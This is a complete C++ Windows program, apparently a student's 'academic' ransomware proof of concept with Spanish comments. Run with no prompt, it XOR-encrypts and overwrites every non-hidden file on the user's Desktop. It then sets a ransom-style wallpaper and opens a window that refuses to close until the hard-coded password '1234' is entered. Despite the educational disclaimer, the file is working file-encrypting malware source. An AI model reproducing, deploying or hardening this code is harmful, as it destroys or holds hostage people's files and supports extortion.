// RANSOMWARE XOR ACADEMICO - PRUEBA DE CONCEPTO
// AUTOR: Roberto Perez
// FECHA: Agosto - Septiembre 2025
// DESCRIPCIÓN: Implementación de un ransomware educativo que utiliza cifrado XOR simple
//              para encriptar archivos en el escritorio del usuario. Incluye una interfaz
//              gráfica para ingresar la contraseña y desencriptar los archivos.
// NOTA: Este código es solo para fines educativos y no debe ser utilizado con fines maliciosos.
//       Asegúrese de tener permiso para ejecutar este código en el entorno donde se pruebe.
// COMPILACIÓN: Utilice un compilador compatible con C++ y la API de Windows.
//              Asegúrese de vincular las bibliotecas necesarias para la GUI de Windows.
// AVISO LEGAL: El autor no se hace responsable del uso indebido de este código.
//              Utilícelo bajo su propio riesgo y siempre con fines educativos.
// PRIVACIDAD: Este código no recopila ni transmite datos del usuario.
//             Todos los datos permanecen localmente en el sistema del usuario.
//            No se envía ninguna información a servidores externos.
// Password para desencriptar: 1234
// ------------------------------------------------------------------------------------------

#include "phc_image_data.h"
#include "phc_image_final.h"

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdlib>
#include <sys/stat.h>
#include <iomanip>
#include <sstream>
#include <cstring>
#include <random>
#include <chrono>
#include <windows.h>
#include <fileapi.h>
#include <io.h>
#include <fcntl.h>
#include <commctrl.h>

using namespace std;

std::string DIRPATH;
const size_t KEYLENGTH = 32;
const size_t IVLENGTH = 16;
const char* CORRECT_PASSWORD = "1234";

#define ID_PASSWORD_EDIT 1001
#define ID_DECRYPT_BUTTON 1002
#define ID_STATUS_TEXT 1003

HWND hPasswordEdit;
HWND hDecryptButton;
HWND hStatusText;
HWND hMainWindow;

// CIFRADO XOR SIMPLE
class SimpleAES {
private:
    static const int BLOCK_SIZE = 16;
    
public:
    static std::string xorEncrypt(const std::string& data, const std::vector<unsigned char>& key) {
        std::string result = data;
        for (size_t i = 0; i < data.length(); ++i) {
            result[i] = data[i] ^ key[i % key.size()];
        }
        return result;
    }
    
    static std::string xorDecrypt(const std::string& data, const std::vector<unsigned char>& key) {
        return xorEncrypt(data, key);
    }
    
    static std::string addPadding(const std::string& data) {
        int padding = BLOCK_SIZE - (data.length() % BLOCK_SIZE);
        std::string result = data;
        for (int i = 0; i < padding; ++i) {
            result += static_cast<char>(padding);
        }
        return result;
    }
    
    static std::string removePadding(const std::string& data) {
        if (data.empty()) return data;
        
        unsigned char padding = static_cast<unsigned char>(data.back());
        if (padding > BLOCK_SIZE || padding == 0) return data;
        
        return data.substr(0, data.length() - padding);
    }
};

// GENERADOR DE CLAVES ALEATORIAS
class SimpleRandom {
private:
    std::mt19937 generator;
    
public:
    SimpleRandom() {
        auto seed = std::chrono::high_resolution_clock::now().time_since_epoch().count();
        generator.seed(static_cast<unsigned int>(seed));
    }
    
    void generateBytes(unsigned char* buffer, size_t length) {
        std::uniform_int_distribution<int> distribution(0, 255);
        for (size_t i = 0; i < length; ++i) {
            buffer[i] = static_cast<unsigned char>(distribution(generator));
        }
    }
};

// UTILIDADES DE CONVERSIÓN
std::string bytesToHex(const unsigned char* data, size_t len) {
    std::stringstream ss;
    ss << std::hex;
    for (size_t i = 0; i < len; ++i) {
        ss << std::setw(2) << std::setfill('0') << (int)data[i];
    }
    return ss.str();
}

std::string stringToHex(const std::string& data) {
    return bytesToHex(reinterpret_cast<const unsigned char*>(data.c_str()), data.length());
}

std::vector<unsigned char> hexToBytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        unsigned char byte = static_cast<unsigned char>(strtol(byteString.c_str(), NULL, 16));
        bytes.push_back(byte);
    }
    return bytes;
}

std::string hexToString(const std::string& hex) {
    std::vector<unsigned char> bytes = hexToBytes(hex);
    return std::string(bytes.begin(), bytes.end());
}

// LECTURA DE ARCHIVOS
std::vector<std::string> getFileNames() {
    std::vector<std::string> files;
    WIN32_FIND_DATA findFileData;
    std::string searchPath = DIRPATH + "*";
    HANDLE hFind = FindFirstFile(searchPath.c_str(), &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string filename = findFileData.cFileName;
                if (filename != "." && filename != ".." && filename.find(".") != 0 && 
                    filename != "PHCAcademico.exe") {
                    files.push_back(filename);
                }
            }
        } while (FindNextFile(hFind, &findFileData) != 0);
        FindClose(hFind);
    }
    return files;
}

std::string readFileContents(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        return "";
    }
    
    std::string contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    return contents;
}

void writeFileContents(const std::string& filePath, const std::string& contents) {
    std::ofstream file(filePath, std::ios::binary | std::ios::trunc);
    if (!file) {
        return;
    }
    
    file << contents;
    file.close();
}

// MANEJO DE WALLPAPER
std::string GetTempEmbeddedImagePath() {
    const char* tempDir = getenv("TEMP");
    if (!tempDir) tempDir = "C:\\temp";
    return std::string(tempDir) + "\\phc_embedded.png";
}

std::string GetTempFinalImagePath() {
    const char* tempDir = getenv("TEMP");
    if (!tempDir) tempDir = "C:\\temp";
    return std::string(tempDir) + "\\phc_final.png";
}

bool WriteEmbeddedImageToTemp(std::string& outPath) {
    outPath = GetTempEmbeddedImagePath();
    
    std::ofstream tempFile(outPath, std::ios::binary);
    if (!tempFile) {
        return false;
    }
    
    tempFile.write(reinterpret_cast<const char*>(PHC_IMAGE_DATA), PHC_IMAGE_SIZE);
    tempFile.close();
    
    return tempFile.good();
}

bool WriteFinalImageToTemp(std::string& outPath) {
    outPath = GetTempFinalImagePath();
    
    std::ofstream tempFile(outPath, std::ios::binary);
    if (!tempFile) {
        return false;
    }
    
    tempFile.write(reinterpret_cast<const char*>(PHC_IMAGE_FINAL), PHC_FINALIMAGE_SIZE);
    tempFile.close();
    
    return tempFile.good();
}

bool SetWallpaper(const std::string& /*imagePathNoUsado*/) {
    std::string tempPath;
    if (!WriteEmbeddedImageToTemp(tempPath)) {
        return false;
    }
    
    return SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)tempPath.c_str(), 
                                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE) != 0;
}

bool SetFinalWallpaper() {
    std::string tempPath;
    if (!WriteFinalImageToTemp(tempPath)) {
        return false;
    }
    
    return SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)tempPath.c_str(), 
                                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE) != 0;
}

bool RestoreWallpaper() {
    if (!SetFinalWallpaper()) {
        return false;
    }
    
    std::string tempPath1 = GetTempEmbeddedImagePath();
    DeleteFileA(tempPath1.c_str());
    
    return true;
}

// ENCRIPTACIÓN DE ARCHIVOS
bool simpleEncrypt() {
    const char* user = getenv("USERPROFILE");
    if (!user) {
        user = getenv("HOME");
    }
    
    DIRPATH = std::string(user) + "\\Desktop\\";

    std::vector<std::string> fileNames = getFileNames();
    
    if (fileNames.empty()) {
        return false;
    }
    
    SimpleRandom rng;
    int encryptedCount = 0;
    
    for (const auto& filename : fileNames) {
        std::string filePath = DIRPATH + filename;
        std::string contents = readFileContents(filePath);
        
        if (contents.empty()) {
            continue;
        }
        
        std::vector<unsigned char> key(KEYLENGTH);
        rng.generateBytes(key.data(), KEYLENGTH);
        
        std::string paddedContent = SimpleAES::addPadding(contents);
        std::string encryptedContent = SimpleAES::xorEncrypt(paddedContent, key);
        
        std::string keyHex = bytesToHex(key.data(), KEYLENGTH);
        std::string dataHex = stringToHex(encryptedContent);
        
        std::string finalContent = keyHex + ":" + dataHex;
        
        writeFileContents(filePath, finalContent);
        encryptedCount++;
    }
    
    if (encryptedCount > 0) {
        SetWallpaper("");
        return true;
    }
    
    return false;
}

// DESENCRIPTACIÓN DE ARCHIVOS
bool simpleDecrypt() {
    const char* user = getenv("USERPROFILE");
    if (!user) {
        user = getenv("HOME");
    }
    
    DIRPATH = std::string(user) + "\\Desktop\\";

    std::vector<std::string> fileNames = getFileNames();
    
    if (fileNames.empty()) {
        return false;
    }
    
    int decryptedCount = 0;
    
    for (const auto& filename : fileNames) {
        std::string filePath = DIRPATH + filename;
        std::string contents = readFileContents(filePath);
        
        if (contents.empty()) {
            continue;
        }
        
        size_t pos = contents.find(':');
        
        if (pos == std::string::npos) {
            continue;
        }
        
        std::string keyHex = contents.substr(0, pos);
        std::string dataHex = contents.substr(pos + 1);
        
        try {
            std::vector<unsigned char> key = hexToBytes(keyHex);
            std::string encryptedData = hexToString(dataHex);
            
            if (key.size() != KEYLENGTH) {
                continue;
            }
            
            std::string decryptedData = SimpleAES::xorDecrypt(encryptedData, key);
            std::string originalContent = SimpleAES::removePadding(decryptedData);
            
            writeFileContents(filePath, originalContent);
            decryptedCount++;
        }
        catch (const std::exception& e) {
            continue;
        }
    }
    
    if (decryptedCount > 0) {
        RestoreWallpaper();
        return true;
    }
    
    return false;
}

// GUI PRINCIPAL
void UpdateStatusText(const char* message) {
    SetWindowTextA(hStatusText, message);
}

void OnDecryptButtonClick() {
    char password[256];
    GetWindowTextA(hPasswordEdit, password, sizeof(password));
    
    if (strcmp(password, CORRECT_PASSWORD) == 0) {
        UpdateStatusText("Contraseña correcta. Desencriptando...");
        
        EnableWindow(hDecryptButton, FALSE);
        
        if (simpleDecrypt()) {
            UpdateStatusText("Archivos desencriptados exitosamente.");
            MessageBoxA(hMainWindow, "Archivos desencriptados exitosamente.\nFondo de pantalla restaurado.", 
                       "Éxito", MB_OK | MB_ICONINFORMATION);
        } else {
            UpdateStatusText("No se encontraron archivos para desencriptar.");
            MessageBoxA(hMainWindow, "No se encontraron archivos para desencriptar.", 
                       "Información", MB_OK | MB_ICONWARNING);
        }
        
        DestroyWindow(hMainWindow);
    } else {
        UpdateStatusText("Contraseña incorrecta.");
        SetWindowTextA(hPasswordEdit, "");
        SetFocus(hPasswordEdit);
        
        MessageBoxA(hMainWindow, "Contraseña incorrecta. La aplicación no se puede cerrar sin la contraseña correcta.", 
                   "Acceso Denegado", MB_OK | MB_ICONERROR);
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CLOSE:
        MessageBoxA(hwnd, "Debe ingresar la contraseña correcta para cerrar la aplicación.", 
                   "Acceso Restringido", MB_OK | MB_ICONWARNING);
        return 0;
        
    case WM_CREATE:
        {
            HFONT hFont = CreateFontA(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
                                     DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, 
                                     CLEARTYPE_QUALITY, VARIABLE_PITCH, "Segoe UI");
            
            HFONT hTitleFont = CreateFontA(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, 
                                          DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, 
                                          CLEARTYPE_QUALITY, VARIABLE_PITCH, "Segoe UI");
            
            HWND hTitle = CreateWindowExA(0, "STATIC", "PRUEBA ACADEMICA - ENCRIPTACION XOR",
                                         WS_VISIBLE | WS_CHILD | SS_CENTER,
                                         20, 30, 360, 30,
                                         hwnd, NULL, NULL, NULL);
            SendMessage(hTitle, WM_SETFONT, (WPARAM)hTitleFont, TRUE);
            
            HWND hPasswordLabel = CreateWindowExA(0, "STATIC", "PASSWORD:",
                                                 WS_VISIBLE | WS_CHILD,
                                                 50, 100, 100, 25,
                                                 hwnd, NULL, NULL, NULL);
            SendMessage(hPasswordLabel, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            hPasswordEdit = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "",
                                           WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD,
                                           50, 130, 300, 30,
                                           hwnd, (HMENU)ID_PASSWORD_EDIT, NULL, NULL);
            SendMessage(hPasswordEdit, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            hDecryptButton = CreateWindowExA(0, "BUTTON", "DESENCRIPTAR",
                                            WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                                            150, 180, 100, 35,
                                            hwnd, (HMENU)ID_DECRYPT_BUTTON, NULL, NULL);
            SendMessage(hDecryptButton, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            hStatusText = CreateWindowExA(0, "STATIC", "Archivos encriptados. Ingrese la contraseña para desencriptar.",
                                         WS_VISIBLE | WS_CHILD | SS_CENTER,
                                         20, 240, 360, 40,
                                         hwnd, (HMENU)ID_STATUS_TEXT, NULL, NULL);
            SendMessage(hStatusText, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            SetFocus(hPasswordEdit);
        }
        break;
        
    case WM_COMMAND:
        if (LOWORD(wParam) == ID_DECRYPT_BUTTON || 
           (LOWORD(wParam) == ID_PASSWORD_EDIT && HIWORD(wParam) == EN_CHANGE)) {
            if (LOWORD(wParam) == ID_DECRYPT_BUTTON) {
                OnDecryptButtonClick();
            }
        }
        break;
        
    case WM_KEYDOWN:
        if (wParam == VK_RETURN) {
            OnDecryptButtonClick();
        }
        break;
        
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
        
    default:
        return DefWindowProcA(hwnd, uMsg, wParam, lParam);
    }
    
    return 0;
}

// FUNCIÓN PRINCIPAL
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char* user = getenv("USERPROFILE");
    if (!user) {
        user = getenv("HOME");
    }
    DIRPATH = std::string(user) + "\\Desktop\\";
    
    simpleEncrypt();
    
    const char* CLASS_NAME = "PHCEncryptionWindow";
    
    WNDCLASSA wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    RegisterClassA(&wc);
    
    hMainWindow = CreateWindowExA(
        0,
        CLASS_NAME,
        "PHC - Prueba Académica de Encriptación",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
        CW_USEDEFAULT, CW_USEDEFAULT, 420, 350,
        NULL, NULL, hInstance, NULL
    );
    
    if (hMainWindow == NULL) {
        return 0;
    }
    
    ShowWindow(hMainWindow, nCmdShow);
    UpdateWindow(hMainWindow);
    
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_RETURN && msg.hwnd == hPasswordEdit) {
            OnDecryptButtonClick();
            continue;
        }
        
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}